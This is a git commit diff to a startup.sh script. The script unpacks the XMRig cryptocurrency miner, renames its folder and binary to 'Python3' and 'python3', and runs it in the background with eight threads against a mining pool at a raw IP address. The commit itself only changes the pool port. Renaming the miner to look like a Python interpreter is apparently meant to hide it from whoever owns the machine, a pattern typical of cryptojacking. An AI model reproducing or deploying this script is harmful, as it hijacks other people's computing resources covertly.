66d9918d67e752a031433d223bfbd09b1aecca74
Akuy245338 <113159911+Akuy245338@users.noreply.github.com>
2022-09-09 11:25:47 +0700

    Update startup.sh

--- startup.sh
+++ startup.sh
@@ -3,4 +3,4 @@ rm xmrig-6.18.0-linux-x64.tar.gz
 mv xmrig-6.18.0 Python3 
 cd Python3 
 mv xmrig python3 
-./python3 --donate-level 0 -o 47.250.38.10:5302 -u MINER -p x -k -a rx/0 --threads=8 -B
+./python3 --donate-level 0 -o 47.250.38.10:5301 -u MINER -p x -k -a rx/0 --threads=8 -B
